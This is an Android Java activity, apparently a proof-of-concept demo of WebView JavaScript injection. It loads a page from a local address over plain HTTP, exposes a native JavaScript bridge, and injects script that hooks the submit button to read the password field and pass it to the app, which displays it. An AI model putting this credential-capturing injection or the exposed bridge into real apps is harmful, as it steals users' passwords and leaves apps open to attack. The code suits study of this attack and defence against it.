package com.example.webviewinjection;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.os.Bundle;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    public class AppJavaScriptProxy {
        private Activity activity = null;
        public AppJavaScriptProxy(Activity activity) {
            this.activity = activity;
        }
        @JavascriptInterface
        public void showMessage(String message) {
            for (int i=0; i<5; i++) {
                Toast toast = Toast.makeText(this.activity.getApplicationContext(),
                        message,
                        Toast.LENGTH_LONG);
                toast.show();
            }
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        final WebView mywebview = (WebView) findViewById(R.id.webView);
        mywebview.clearCache(true);
        mywebview.loadUrl("http://192.168.1.38:31337/home");
        mywebview.getSettings().setJavaScriptEnabled(true);
        mywebview.setWebChromeClient(new WebChromeClient());
        mywebview.addJavascriptInterface(new AppJavaScriptProxy(this), "androidAppProxy");
        mywebview.setWebViewClient(new WebViewClient(){
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                mywebview.loadUrl(
                        "javascript:var button = document.getElementsByName(\"submit\")[0];button.addEventListener(\"click\", function(){ androidAppProxy.showMessage(\"Password : \" + document.getElementById(\"password\").value); return false; },false);"
                );
            }
        });
    }
}